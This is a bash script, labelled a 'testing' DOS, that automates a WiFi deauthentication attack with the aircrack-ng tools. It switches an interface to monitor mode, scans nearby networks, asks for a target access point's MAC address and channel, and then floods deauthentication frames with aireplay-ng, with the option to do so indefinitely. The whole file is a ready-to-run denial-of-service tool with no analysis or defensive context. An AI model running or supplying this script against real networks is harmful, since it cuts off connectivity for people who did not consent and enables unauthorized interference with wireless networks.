#!/bin/bash
echo -e "\033[1;33mWelcome to the 'testing' DOS\033[1;37m"
echo -e "\033[0;33mChoose your WiFi interface and write it, type '\033[1mstop\033[0m' \033[0;33mif you want to exit :"
airmon-ng

read UserChoice

if [[ $UserChoice == "stop" || $UserChoice == "Stop" ]];then 
	exit 1
elif [[ $(cat /sys/class/net/$UserChoice/operstate) == "up" ]];then
	airmon-ng start $UserChoice
else
	echo -e "\033[31mInput doesn't contain a valid choice."
	exit 1
fi


echo -e "\033[1;31mPress Ctrl+C when you see the box to attack."

airodump-ng $UserChoice"mon"

read -p $'\e[36mOn which channel? : \e[0m' channel

if [[ $channel =~ [0-9] ]];then
	iwconfig $UserChoice"mon" channel $channel
elif [[ $channel == "stop" || $channel == "Stop" ]];then
	airmon-ng stop $UserChoice"mon"
	systemctl restart NetworkManager
	exit 1
else
	echo -e "\033[31mInput doesn't contain a valid choice."
	airmon-ng stop $UserChoice"mon"
	systemctl restart NetworkManager
	exit 1
fi

read -p $'\e[36mEnter the MAC adress of the box you want to attack : \e[0m' UserChoice2

if [[ $UserChoice2 =~ [0-9A-F][0-9A-F]:[0-9A-Z][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F] ]];then
	read -p $'\e[36mHow much time do you want to attack it? 0 is unlimited : \e[0m' UserChoice3
	if [[ $UserChoice3 =~ [0-9] ]];then
		aireplay-ng -0 $UserChoice3 -a $UserChoice2 $UserChoice"mon"
		echo -e "\033[0;32mNice :)"
		airmon-ng stop $UserChoice"mon"
		systemctl restart NetworkManager
		exit 1
	elif [[ $UserChoice3 == "stop" || $UserChoice3 == "Stop" ]];then
		airmon-ng stop $UserChoice"mon"
		systemctl restart NetworkManager
		exit 1
	else
		echo -e "\033[31mInput doesn't contain a valid choice."
		airmon-ng stop $UserChoice"mon"
		systemctl restart NetworkManager
		exit 1
fi
elif [[ $UserChoice2 == "stop" || $UserChoice2 == "Stop" ]];then
	airmon-ng stop $UserChoice"mon"
	systemctl restart NetworkManager
	exit 1
else
	echo -e "\033[31mInput doesn't contain a valid choice."
	airmon-ng stop $UserChoice"mon"
	systemctl restart NetworkManager
	exit 1
fi
